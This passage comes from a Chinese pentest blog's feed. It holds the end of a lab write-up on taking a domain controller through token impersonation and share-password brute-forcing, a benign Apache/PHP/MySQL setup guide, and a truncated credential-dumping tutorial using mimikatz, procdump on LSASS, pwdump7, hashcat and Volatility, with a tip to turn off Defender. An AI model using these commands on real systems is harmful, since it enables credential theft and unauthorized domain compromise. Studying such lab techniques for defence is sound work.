<h2 id="0x07-获取域控"><a href="#0x07-获取域控" class="headerlink" title="0x07. 获取域控"></a>0x07. 获取域控</h2><h4 id="当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限。下列命令在msf上很容易就能偷取到域控的token，不过我这里并没有用域控在w2k3执行什么命令所以并没有获取到域控的token…"><a href="#当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限。下列命令在msf上很容易就能偷取到域控的token，不过我这里并没有用域控在w2k3执行什么命令所以并没有获取到域控的token…" class="headerlink" title="当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限。下列命令在msf上很容易就能偷取到域控的token，不过我这里并没有用域控在w2k3执行什么命令所以并没有获取到域控的token…"></a>当有域控账户登陆至服务器时可使用令牌模拟进行渗透取得域控权限。下列命令在msf上很容易就能偷取到域控的token，不过我这里并没有用域控在w2k3执行什么命令所以并没有获取到域控的token…</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">use incognito </div><div class="line">list_tokens –u #列出可用token，假如找到域控token </div><div class="line">impersonate_token lab\\administrator</div></pre></td></tr></table></figure>
<h4 id="下面我换一种方式得到域控的shell："><a href="#下面我换一种方式得到域控的shell：" class="headerlink" title="下面我换一种方式得到域控的shell："></a>下面我换一种方式得到域控的shell：</h4><h4 id="首先根据之前收集到的信息我们知道管理员账号是admin-、Administrator，域控在DCSERVER这台主机上"><a href="#首先根据之前收集到的信息我们知道管理员账号是admin-、Administrator，域控在DCSERVER这台主机上" class="headerlink" title="首先根据之前收集到的信息我们知道管理员账号是admin$、Administrator，域控在DCSERVER这台主机上"></a>首先根据之前收集到的信息我们知道管理员账号是admin$、Administrator，域控在DCSERVER这台主机上</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519154516_dBVly7_Screenshot.jpeg" alt=""></p>
<h4 id="接着我们依旧用administrator账号登陆w2k3利用爆破脚本对-admin-进行密码爆破，这里我使用的是一个常用的账号密码所以很容易爆破出来！"><a href="#接着我们依旧用administrator账号登陆w2k3利用爆破脚本对-admin-进行密码爆破，这里我使用的是一个常用的账号密码所以很容易爆破出来！" class="headerlink" title="接着我们依旧用administrator账号登陆w2k3利用爆破脚本对 admin$进行密码爆破，这里我使用的是一个常用的账号密码所以很容易爆破出来！"></a>接着我们依旧用administrator账号登陆w2k3利用爆破脚本对 admin$进行密码爆破，这里我使用的是一个常用的账号密码所以很容易爆破出来！</h4><blockquote>
<p>ipccrack.bat dcserver admin$ password.txt</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519160306_EFdL1v_Screenshot.jpeg" alt=""></p>
<h4 id="账号密码已经获取到了，接下来就是利用和ipc-入侵相似的手法进行后续渗透"><a href="#账号密码已经获取到了，接下来就是利用和ipc-入侵相似的手法进行后续渗透" class="headerlink" title="账号密码已经获取到了，接下来就是利用和ipc$入侵相似的手法进行后续渗透"></a>账号密码已经获取到了，接下来就是利用和ipc$入侵相似的手法进行后续渗透</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/%E6%BC%AB%E8%B0%88%E6%94%BB%E5%87%BB%E9%93%BE--%E4%BB%8Ewebshell%E5%88%B0%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/20180519161150_GlFrvt_Screenshot.jpeg" alt=""></p>
<h2 id="0x08-结语"><a href="#0x08-结语" class="headerlink" title="0x08. 结语"></a>0x08. 结语</h2><h4 id="此次渗透流程主要是利用信息收集作为最有力的辅助手段，并没有给大家介绍某种EXP直接打入内网拿下域控，因为在实战中如果大部分漏洞被修补之后信息收集才是我们最得力的帮手！另外，如果大家想要自己搭建一下本文中介绍到的环境、使用的工具、配套视屏的话欢迎进入我的网盘下载："><a href="#此次渗透流程主要是利用信息收集作为最有力的辅助手段，并没有给大家介绍某种EXP直接打入内网拿下域控，因为在实战中如果大部分漏洞被修补之后信息收集才是我们最得力的帮手！另外，如果大家想要自己搭建一下本文中介绍到的环境、使用的工具、配套视屏的话欢迎进入我的网盘下载：" class="headerlink" title="此次渗透流程主要是利用信息收集作为最有力的辅助手段，并没有给大家介绍某种EXP直接打入内网拿下域控，因为在实战中如果大部分漏洞被修补之后信息收集才是我们最得力的帮手！另外，如果大家想要自己搭建一下本文中介绍到的环境、使用的工具、配套视屏的话欢迎进入我的网盘下载："></a>此次渗透流程主要是利用信息收集作为最有力的辅助手段，并没有给大家介绍某种EXP直接打入内网拿下域控，因为在实战中如果大部分漏洞被修补之后信息收集才是我们最得力的帮手！另外，如果大家想要自己搭建一下本文中介绍到的环境、使用的工具、配套视屏的话欢迎进入我的网盘下载：</h4><h4 id="网盘链接-密码-fcxx"><a href="#网盘链接-密码-fcxx" class="headerlink" title="网盘链接:  密码:fcxx"></a><a href="https://pan.baidu.com/s/1rp9jP3SLycSgrhqs7AxyXQ" target="_blank" rel="external">网盘链接:</a>  密码:fcxx</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[win2003 下搭建Apache2 + PHP5 + Mysql + phpMyAdmin]]></title>
      <url>/2018/05/15/win2003-%E4%B8%8B%E6%90%AD%E5%BB%BAApache2-PHP5-Mysql-phpMyAdmin/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00. 前言"></a>0x00. 前言</h2><h4 id="emsp-emsp-这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘-密码-8r5k，节约大家搜集软件的时间！"><a href="#emsp-emsp-这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘-密码-8r5k，节约大家搜集软件的时间！" class="headerlink" title="&emsp;&emsp;这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到我的云盘  密码:8r5k，节约大家搜集软件的时间！"></a>&emsp;&emsp;这两天在学习总结域渗透相关知识，也搭建了一套域环境，但是在域成员中无法启动phpstudy，xlion大佬建议我自己搭建一套web环境，尽量模拟公司的真实环境，于是就有了这篇文章，希望给大家填坑吧，我也会把相关软件传到<a href="https://pan.baidu.com/s/1BnB2zr5hxbLRY1yHzX18rA" target="_blank" rel="external">我的云盘</a>  密码:8r5k，节约大家搜集软件的时间！</h4><a id="more"></a>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515161655_XsJ6cp_Screenshot.jpeg" alt=""></p>
<h2 id="0x01-搭建Apache2-2"><a href="#0x01-搭建Apache2-2" class="headerlink" title="0x01. 搭建Apache2_2"></a>0x01. 搭建Apache2_2</h2><blockquote>
<ol>
<li>运行apache2.2.10-win32-x86-no_ssl.msi</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515162134_VYC3ZY_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>一路下一步，到了域名那里随便填一个域名就可以了，接着下一步选择Custom 模式自定义安装</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515162424_q4MzyV_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>然后选择Apache Http Server 2.2.10，再点击change改变安装目录为C:\apm\apache2</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515163752_P2zqe4_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>再一路默认就安装好了，在右下角有apache的图标，到目前为止apache就安装好了</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515184948_S8kjnH_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-安装PHP5"><a href="#0x02-安装PHP5" class="headerlink" title="0x02. 安装PHP5"></a>0x02. 安装PHP5</h2><blockquote>
<ol>
<li>将PHP5 文件夹拖到C:\apm\ 文件夹下</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515163959_KVEfGb_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>将php5 文件下面的php.ini-development 文件修改为php.ini</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515164353_J0zlrX_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>（1）打开php.ini 将 ; extension_dir = “./“ 修改为extension_dir = “c:\apm\php5\ext”  ; </li>
</ol>
<p>（2）去掉 extension=php_gd2.dll，extension=php_mbstring.dll，extension=php_mysql.dll, extension=php_mysqli.dll 前面的 ; </p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515164814_CEmJ79_Screenshot.jpeg" alt=""></p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515172545_QSyuFx_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>（1）打开c:\apm\apache2\conf\httpd.conf 配置文件，找到DirectoryIndex index.html，修改为DirectoryIndex index.html index.php login.php</li>
</ol>
<p>（2）找到 #LoadModule vhost_alias_module modules/mod_vhost_alias.so 在这行的后面添加以下内容：</p>
</blockquote>
<p>“””</p>
<p>LoadModule php5_module “c:/apm/php5/php5apache2_2.dll”</p>
<p>AddType application/x-httpd-php .php</p>
<p>PHPIniDir “c:/apm/php5/php.ini”</p>
<p>“””</p>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515170629_zXk59X_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>添加系统环境变量，将 ;c:\apm\php5;c:\apm\php5\ext 加到环境变量后面</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515170927_ajfy4v_Screenshot.jpeg" alt=""></p>
<blockquote>
<ol>
<li>重启计算机就能看到已经将PHP整合到Apache中了，此时已经可以解析php文件</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515171051_ibNpr4_Screenshot.jpeg" alt=""></p>
<h2 id="0x03-安装phpMyAdmin"><a href="#0x03-安装phpMyAdmin" class="headerlink" title="0x03. 安装phpMyAdmin"></a>0x03. 安装phpMyAdmin</h2><blockquote>
<p>将phpMyAdmin 文件夹放到c:\apm\apache2\htdocs 文件夹下面，在目录中找到一个名为config.sample.inc.php的文件，将此文件复制一份并命名为config.inc.php，这个文件就是phpMyAdmin的配置文件了，重启apache就可以了</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515172728_TN0Ix7_Screenshot.jpeg" alt=""></p>
<h2 id="0x04-安装Mysql"><a href="#0x04-安装Mysql" class="headerlink" title="0x04. 安装Mysql"></a>0x04. 安装Mysql</h2><blockquote>
<ol>
<li>打开mysql-5.5.60-win32.msi ，一路下一步，大致步骤和Apache相似，在“Developer Components（开发者部分）”上左键单击，选择“This feature, and all subfeatures, will be installed on local hard drive.”</li>
</ol>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/win2003%E4%B8%8B%E6%90%AD%E5%BB%BAApache2_PHP5_Mysql_phpMyAdmin/20180515172205_F4qTTj_Screenshot.jpeg" alt=""></p>
<h2 id="0x05-结语"><a href="#0x05-结语" class="headerlink" title="0x05. 结语"></a>0x05. 结语</h2><h4 id="其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。另外，因为Apache默认是system权限运行的，如果想要降权运行的话需要将Apache安装到除c盘外的其它盘符，还需要修改logs文件夹的权限。"><a href="#其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。另外，因为Apache默认是system权限运行的，如果想要降权运行的话需要将Apache安装到除c盘外的其它盘符，还需要修改logs文件夹的权限。" class="headerlink" title="其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。另外，因为Apache默认是system权限运行的，如果想要降权运行的话需要将Apache安装到除c盘外的其它盘符，还需要修改logs文件夹的权限。"></a>其中有部分内容我并没有详细截图，主要是觉得这里很简单，谷歌一下就能搜到。另外，因为Apache默认是system权限运行的，如果想要降权运行的话需要将Apache安装到除c盘外的其它盘符，还需要修改logs文件夹的权限。</h4>]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[Windows密码抓取总结]]></title>
      <url>/2018/04/20/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00. 前言"></a>0x00. 前言</h2><h4 id="渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal-account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。"><a href="#渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal-account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。" class="headerlink" title="渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。"></a>渗透测试过程中我们经常需要获取管理员的账号密码，以便进行更进一步的操作，下面我将给大家总结几种steal account的手法！其中可能也会涉及到apt的内容，希望大家喜欢。</h4><a id="more"></a>
<blockquote>
<p> [本教程具有一定攻击性，仅限于教学使用，不得用于其他用途]</p>
</blockquote>
<h2 id="0x01-利用mimikatz获取明文密码"><a href="#0x01-利用mimikatz获取明文密码" class="headerlink" title="0x01. 利用mimikatz获取明文密码"></a>0x01. 利用mimikatz获取明文密码</h2><h4 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h4><h4 id="emsp-emsp-windows-10-emsp-（win-10中有defender会杀掉我们的mimikatz，关掉就好）"><a href="#emsp-emsp-windows-10-emsp-（win-10中有defender会杀掉我们的mimikatz，关掉就好）" class="headerlink" title="&emsp;&emsp;windows 10  &emsp;// （win 10中有defender会杀掉我们的mimikatz，关掉就好）"></a>&emsp;&emsp;windows 10  &emsp;// （win 10中有defender会杀掉我们的mimikatz，关掉就好）</h4><h4 id="emsp-emsp-mimikatz-trunk-emsp-download-here"><a href="#emsp-emsp-mimikatz-trunk-emsp-download-here" class="headerlink" title="&emsp;&emsp;mimikatz_trunk &emsp;// download here"></a>&emsp;&emsp;mimikatz_trunk &emsp;// <a href="http://blog.gentilkiwi.com/mimikatz" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤："><a href="#实验步骤：" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-首先用管理员账号运行cmd-exe，这样才能让mimikatz正常运行"><a href="#1-首先用管理员账号运行cmd-exe，这样才能让mimikatz正常运行" class="headerlink" title="1. 首先用管理员账号运行cmd.exe，这样才能让mimikatz正常运行 :)"></a>1. 首先用管理员账号运行cmd.exe，这样才能让mimikatz正常运行 :)</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180418203056_WR5Aim_Screenshot.jpeg" alt=""></p>
<h4 id="2-紧接着再进入mimikatz，运行命令"><a href="#2-紧接着再进入mimikatz，运行命令" class="headerlink" title="2. 紧接着再进入mimikatz，运行命令"></a>2. 紧接着再进入mimikatz，运行命令</h4><blockquote>
<p>privilege::debug</p>
<p>sekurlsa::logonpasswords</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180418205101_7Jvn4f_Screenshot.jpeg" alt=""></p>
<blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180418204329_wHS2Qi_Screenshot.jpeg" alt=""></p>
</blockquote>
<h4 id="3-此时我们就能得到username，password的密文，给大家推荐个网站-here，这里可以很容易的解密大多数密文"><a href="#3-此时我们就能得到username，password的密文，给大家推荐个网站-here，这里可以很容易的解密大多数密文" class="headerlink" title="3. 此时我们就能得到username，password的密文，给大家推荐个网站-here，这里可以很容易的解密大多数密文"></a>3. 此时我们就能得到username，password的密文，给大家推荐个<a href="https://www.somd5.com" target="_blank" rel="external">网站-here</a>，这里可以很容易的解密大多数密文</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180418204918_4DUANd_Screenshot.jpeg" alt=""></p>
<h2 id="0x02-利用procdump-amp-mimikatz获取密码"><a href="#0x02-利用procdump-amp-mimikatz获取密码" class="headerlink" title="0x02. 利用procdump &amp; mimikatz获取密码"></a>0x02. 利用procdump &amp; mimikatz获取密码</h2><h4 id="实验环境：-1"><a href="#实验环境：-1" class="headerlink" title="实验环境："></a>实验环境：</h4><h4 id="emsp-emsp-1-windows-7"><a href="#emsp-emsp-1-windows-7" class="headerlink" title="&emsp;&emsp;1. windows 7"></a>&emsp;&emsp;1. windows 7</h4><h4 id="emsp-emsp-2-procdump-emsp-download-here"><a href="#emsp-emsp-2-procdump-emsp-download-here" class="headerlink" title="&emsp;&emsp;2. procdump &emsp;// download here"></a>&emsp;&emsp;2. procdump &emsp;// <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump" target="_blank" rel="external">download here</a></h4><h4 id="emsp-emsp-3-mimikatz-trunk"><a href="#emsp-emsp-3-mimikatz-trunk" class="headerlink" title="&emsp;&emsp;3. mimikatz_trunk"></a>&emsp;&emsp;3. mimikatz_trunk</h4><h4 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤:"></a>实验步骤:</h4><h4 id="1-首先用procdump下载LSASS进程的内存，因为procdump是Microsoft-Sysinternals-tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd-）"><a href="#1-首先用procdump下载LSASS进程的内存，因为procdump是Microsoft-Sysinternals-tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd-）" class="headerlink" title="1. 首先用procdump下载LSASS进程的内存，因为procdump是Microsoft Sysinternals tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd ）"></a>1. 首先用procdump下载LSASS进程的内存，因为procdump是Microsoft Sysinternals tools中的工具，所以AV是不会查杀它的（记住用管理员运行cmd ）</h4><blockquote>
<p>C:\Users\times0ng\Desktop\Procdump\procdump.exe -accepteula -ma lsass.exe  C:\Users\times0ng\Desktop\lsass.dmp</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180418212206_7LasW4_Screenshot.jpeg" alt=""></p>
<h4 id="2-接着用mimikatz打开dmp文件，获取内存中的内容-emsp-（-lsass-dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式-）"><a href="#2-接着用mimikatz打开dmp文件，获取内存中的内容-emsp-（-lsass-dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式-）" class="headerlink" title="2. 接着用mimikatz打开dmp文件，获取内存中的内容 &emsp;// （ lsass.dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式 ）"></a>2. 接着用mimikatz打开dmp文件，获取内存中的内容 &emsp;// （ lsass.dmp可以下载到我们本地主机再查看里面的内容，相当于离线模式 ）</h4><blockquote>
<p>C:\Users\times0ng\Desktop\mimikatz_trunk\x64\mimikatz.exe</p>
<p>sekurlsa::minidump C:\Users\time0sng\Desktop\lsass.dmp</p>
<p>sekurlsa::tspkg</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180418212557_gNzdRI_Screenshot.jpeg" alt=""></p>
<h2 id="0x03-利用pwdump7获取密码"><a href="#0x03-利用pwdump7获取密码" class="headerlink" title="0x03. 利用pwdump7获取密码"></a>0x03. 利用<strong>pwdump7</strong>获取密码</h2><p>实验环境：</p>
<h4 id="emsp-emsp-windows-7"><a href="#emsp-emsp-windows-7" class="headerlink" title="&emsp;&emsp;windows 7"></a>&emsp;&emsp;windows 7</h4><h4 id="emsp-emsp-pwdump7-emsp-download-here"><a href="#emsp-emsp-pwdump7-emsp-download-here" class="headerlink" title="&emsp;&emsp;pwdump7 &emsp;// download here"></a>&emsp;&emsp;<strong>pwdump7</strong> &emsp;// <a href="http://passwords.openwall.net/b/pwdump/pwdump7.zip" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤：-1"><a href="#实验步骤：-1" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-直接用管理员运行cmd，再运行pwdump7-exe"><a href="#1-直接用管理员运行cmd，再运行pwdump7-exe" class="headerlink" title="1. 直接用管理员运行cmd，再运行pwdump7.exe"></a>1. 直接用管理员运行cmd，再运行pwdump7.exe</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419001635_R2mdci_Screenshot.jpeg" alt=""></p>
<h4 id="2-用hashcat直接跑NTLM密码"><a href="#2-用hashcat直接跑NTLM密码" class="headerlink" title="2. 用hashcat直接跑NTLM密码"></a>2. 用hashcat直接跑NTLM密码</h4><blockquote>
<p>hashcat -m 1000 AFC44EE7351D61D00698796DA06B1EBF /usr/share/wordlists/sqlmap.txt –force</p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419002119_puCgGq_Screenshot.jpeg" alt=""></p>
<h2 id="0x04-利用虚拟机文件获取密码"><a href="#0x04-利用虚拟机文件获取密码" class="headerlink" title="0x04. 利用虚拟机文件获取密码"></a>0x04. 利用虚拟机文件获取密码</h2><h4 id="关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：PowerMemory、quarks-pwdump-等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！"><a href="#关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：PowerMemory、quarks-pwdump-等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！" class="headerlink" title="关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：PowerMemory、quarks pwdump 等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！"></a>关于如何用工具直接获取密码就介绍到这里，其实还不止以上这些工具可以帮助我们达到目的，例如：<a href="https://github.com/giMini/PowerMemory" target="_blank" rel="external"><strong>PowerMemory</strong></a>、<a href="https://github.com/quarkslab/quarkspwdump" target="_blank" rel="external"><strong>quarks pwdump </strong></a>等都是不错的工具，不过我觉得以上介绍的已经足够大家使用，贪多嚼不烂，下面我将介绍其它不同于上述的方法获取hash密码！</h4><h4 id="接下来我们将获取Windows-7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生-vmss-和-vmem-文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：Memoryze-、DumpIt"><a href="#接下来我们将获取Windows-7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生-vmss-和-vmem-文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：Memoryze-、DumpIt" class="headerlink" title="接下来我们将获取Windows 7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生 .vmss 和 .vmem 文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：Memoryze 、DumpIt"></a>接下来我们将获取Windows 7虚拟机中的账号密码，首先需要将虚拟机挂起，这样才能产生 <em>.vmss 和 </em>.vmem 文件！这两个文件主要是用来获取内存数据的，如果用其它工具能够获取内存数据的话完全可以不用这两个文件，例如：<a href="https://www.fireeye.com/services/freeware/memoryze.html" target="_blank" rel="external">Memoryze</a> 、<a href="http://qpdownload.com/dumpit/" target="_blank" rel="external">DumpIt</a></h4><h4 id="实验环境：-2"><a href="#实验环境：-2" class="headerlink" title="实验环境："></a>实验环境：</h4><h4 id="emsp-emsp-windows-7-挂起状态"><a href="#emsp-emsp-windows-7-挂起状态" class="headerlink" title="&emsp;&emsp;windows 7 挂起状态"></a>&emsp;&emsp;windows 7 挂起状态</h4><h4 id="emsp-emsp-Vmss2core-emsp-download-here"><a href="#emsp-emsp-Vmss2core-emsp-download-here" class="headerlink" title="&emsp;&emsp;Vmss2core &emsp;// download here"></a>&emsp;&emsp;Vmss2core &emsp;// <a href="https://labs.vmware.com/flings/vmss2core#summary" target="_blank" rel="external">download here</a></h4><h4 id="emsp-emsp-Volatility-emsp-download-here"><a href="#emsp-emsp-Volatility-emsp-download-here" class="headerlink" title="&emsp;&emsp;Volatility  &emsp; // download here"></a>&emsp;&emsp;Volatility  &emsp; // <a href="http://www.volatilityfoundation.org/26" target="_blank" rel="external">download here</a></h4><h4 id="实验步骤：-2"><a href="#实验步骤：-2" class="headerlink" title="实验步骤："></a>实验步骤：</h4><h4 id="1-运行Vmss2core解析虚拟机文件，生成memory-dmp文件"><a href="#1-运行Vmss2core解析虚拟机文件，生成memory-dmp文件" class="headerlink" title="1. 运行Vmss2core解析虚拟机文件，生成memory.dmp文件"></a>1. 运行Vmss2core解析虚拟机文件，生成memory.dmp文件</h4><blockquote>
<p>./vmss2core-mac64 -W /Users/apple1/Documents/Virtual\ Machines.localized/Windows\ 7\ x64.vmwarevm/Windows\ 7\ x64-89925192.vmss /Users/apple1/Documents/Virtual\ Machines.localized/Windows\ 7\ x64.vmwarevm/Windows\ 7\ x64-89925192.vmem </p>
</blockquote>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/blog_image_from_qiniuyun/Windows%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96%E6%80%BB%E7%BB%93/20180419111752_6vqNIx_Screenshot.jpeg" alt=""></p>
<h4 id="2-利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，-profile-Win7SP1x64-架构一定要指定正确，不然会找不到地址"><a href="#2-利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，-profile-Win7SP1x64-架构一定要指定正确，不然会找不到地址" class="headerlink" title="2. 利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，--profile=Win7SP1x64 架构一定要指定正确，不然会找不到地址"></a>2. 利用大神级取证工具volatility获取SYSTEM和SAM的虚拟地址，<strong>-</strong>-profile=Win7SP1x64 架构一定要指定正确，不然会找不到地址</h4><blockquote>
